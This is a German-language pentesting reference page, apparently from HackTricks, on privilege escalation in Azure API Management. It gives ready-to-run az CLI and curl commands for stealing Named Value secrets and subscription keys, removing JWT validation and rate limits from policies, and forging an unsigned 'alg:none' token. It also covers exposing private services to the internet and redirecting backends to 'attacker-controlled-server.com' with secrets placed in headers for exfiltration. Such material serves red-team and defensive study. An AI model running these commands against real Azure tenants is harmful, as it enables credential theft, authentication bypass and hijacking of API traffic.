# Az - API Management Privesc

{{#include ../../../banners/hacktricks-training.md}}

## `Microsoft.ApiManagement/service/namedValues/read` & `Microsoft.ApiManagement/service/namedValues/listValue/action`

Der Angriff besteht darin, auf sensible secrets zuzugreifen, die in Azure API Management Named Values gespeichert sind, entweder durch direktes Abrufen von secret values oder durch Missbrauch von Berechtigungen, um Key Vault–backed secrets über managed identities zu erhalten.
```bash
az apim nv show-secret --resource-group <resource-group> --service-name <service-name> --named-value-id <named-value-id>
```
## `Microsoft.ApiManagement/service/subscriptions/read` & `Microsoft.ApiManagement/service/subscriptions/listSecrets/action`
Für jede Subscription kann ein Angreifer die subscription keys über den listSecrets-Endpunkt mit der POST-Methode erhalten:
```bash
az rest --method POST \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/subscriptions/<subscription-sid>/listSecrets?api-version=2024-05-01"
```
Die Antwort enthält den Subscription-Primary-Key (primaryKey) und den Secondary-Key (secondaryKey). Mit diesen Schlüsseln kann der Angreifer sich authentifizieren und auf die über das API Management Gateway veröffentlichten APIs zugreifen:
```bash
curl -H "Ocp-Apim-Subscription-Key: <primary-key-or-secondary-key>" \
https://<service-name>.azure-api.net/<api-path>
```
Der Angreifer kann auf alle APIs und Produkte zugreifen, die mit der Subscription verknüpft sind. Falls die Subscription Zugriff auf sensible Produkte oder APIs hat, kann der Angreifer vertrauliche Informationen erlangen oder nicht autorisierte Operationen durchführen.

## `Microsoft.ApiManagement/service/policies/write` or `Microsoft.ApiManagement/service/apis/policies/write`

Der Angreifer ruft zunächst die aktuelle API-Policy ab:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/apis/<api-id>/policies/?api-version=2024-05-01&format=rawxml"
```
Der Angreifer kann die Richtlinie auf verschiedene Weise ändern, abhängig von seinen Zielen. Zum Beispiel kann er, um die Authentifizierung zu deaktivieren, wenn die Richtlinie JWT token validation enthält, diesen Abschnitt entfernen oder auskommentieren:
```xml
<policies>
<inbound>
<base />
<!-- JWT validation removed by the attacker -->
<!-- <validate-jwt header-name="Authorization" failed-validation-httpcode="401" >
...
</validate-jwt> -->
</inbound>
<backend>
<base />
</backend>
<outbound>
<base />
</outbound>
<on-error>
<base />
</on-error>
</policies>
```
Um Rate-Limit-Kontrollen zu entfernen und denial-of-service attacks zu ermöglichen, kann der Angreifer quota and rate-limit policies entfernen oder auskommentieren:
```xml
<policies>
<inbound>
<base />
<!-- Rate limiting removed by the attacker -->
<!-- <rate-limit calls="100" renewal-period="60" />
<quota-by-key calls="1000" renewal-period="3600" counter-key="@(context.Subscription.Id)" /> -->
</inbound>
...
</policies>
```
Um die Backend-Route zu ändern und den Datenverkehr zu einem vom Angreifer kontrollierten Server umzuleiten:
```xml
<policies>
...
<inbound>
<base />
<set-backend-service base-url="https://attacker-controlled-server.com" />
</inbound>
...
</policies>
```
Der Angreifer wendet dann die modifizierte Richtlinie an. Der Request-Body muss ein JSON-Objekt sein, das die Richtlinie im XML-Format enthält:
```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/apis/<api-id>/policies/policy?api-version=2024-05-01" \
--headers "Content-Type=application/json" \
--body '{
"properties": {
"format": "rawxml",
"value": "<policies><inbound><base /></inbound><backend><base /></backend><outbound><base /></outbound><on-error><base /></on-error></policies>"
}
}'
```
## JWT-Validierungsfehlkonfiguration

Der Angreifer muss wissen, dass eine API JWT-Token-Validierung verwendet und dass die Policy fehlerhaft konfiguriert ist. Schlecht konfigurierte JWT-Validierungs-Policies können `require-signed-tokens="false"` oder `require-expiration-time="false"` enthalten, was dem Service erlaubt, unsignierte Tokens oder Tokens, die nie ablaufen, zu akzeptieren.

Der Angreifer erstellt ein bösartiges JWT-Token mit dem none-Algorithmus (unsigned):
```
# Header: {"alg":"none"}
# Payload: {"sub":"user"}
eyJhbGciOiJub25lIn0.eyJzdWIiOiJ1c2VyIn0.
```
Der Angreifer sendet eine Anfrage an die API unter Verwendung des bösartigen Tokens:
```bash
curl -X GET \
-H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJ1c2VyIn0." \
https://<apim>.azure-api.net/path
```
Wenn die Richtlinie falsch konfiguriert ist mit `require-signed-tokens="false"`, akzeptiert der Dienst das unsignierte Token. Der Angreifer kann außerdem ein Token ohne Ablauf-Claim erstellen, wenn `require-expiration-time="false"`.

## `Microsoft.ApiManagement/service/applynetworkconfigurationupdates/action`
Der Angreifer prüft zunächst die aktuelle Netzwerkkonfiguration des Dienstes:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<apim>?api-version=2024-05-01"
```
Der Angreifer überprüft die JSON-Antwort, um die Werte von `publicNetworkAccess` und `virtualNetworkType` zu verifizieren. Wenn `publicNetworkAccess` auf false gesetzt ist oder `virtualNetworkType` auf Internal steht, ist der Dienst für privaten Zugriff konfiguriert.

Um den Dienst dem Internet zugänglich zu machen, muss der Angreifer beide Einstellungen ändern. Läuft der Dienst im internen Modus (`virtualNetworkType: "Internal"`), ändert der Angreifer ihn auf None oder External und aktiviert den öffentlichen Netzwerkzugriff. Dies kann mit der Azure Management API durchgeführt werden:
```bash
az rest --method PATCH \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<apim>?api-version=2024-05-01" \
--headers "Content-Type=application/json" \
--body '{
"properties": {
"publicNetworkAccess": "Enabled",
"virtualNetworkType": "None"
}
}'
```
Sobald `virtualNetworkType` auf `None` oder `External` gesetzt ist und `publicNetworkAccess` aktiviert ist, sind der Service und alle seine APIs aus dem Internet zugänglich, selbst wenn sie zuvor hinter einem privaten Netzwerk oder privaten Endpunkten geschützt waren.

## `Microsoft.ApiManagement/service/backends/write`
Der Angreifer listet zunächst die vorhandenen Backends auf, um zu ermitteln, welches er ändern soll:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends?api-version=2024-05-01"
```
Der Angreifer ruft die aktuelle Konfiguration des Backends ab, das er ändern möchte:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends/<backend-id>?api-version=2024-05-01"
```
Der Angreifer ändert die backend-URL so, dass sie auf einen Server unter seiner Kontrolle zeigt. Zuerst erhält er das ETag aus der vorherigen response und aktualisiert dann das backend:
```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends/<backend-id>?api-version=2024-05-01" \
--headers "Content-Type=application/json" "If-Match=*" \
--body '{
"properties": {
"url": "https://attacker-controlled-server.com",
"protocol": "http",
"description": "Backend modified by attacker"
}
}'
```
Alternativ kann der Angreifer Backend-Header konfigurieren, um Named Values mit Geheimnissen zu exfiltrate. Dies erfolgt über die Konfiguration der Backend-Zugangsdaten:
```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends/<backend-id>?api-version=2024-05-01" \
--headers "Content-Type=application/json" "If-Match=*" \
--body '{
"properties": {
"url": "https://attacker-controlled-server.com",
"protocol": "http",
"credentials": {
"header": {
"X-Secret-Value": ["{{named-value-secret}}"]
}
}
}
}'
```
Mit dieser Konfiguration werden Named Values als headers in allen Requests an das attacker-controlled Backend gesendet, wodurch die Exfiltration sensibler Secrets ermöglicht wird.

{{#include ../../../banners/hacktricks-training.md}}
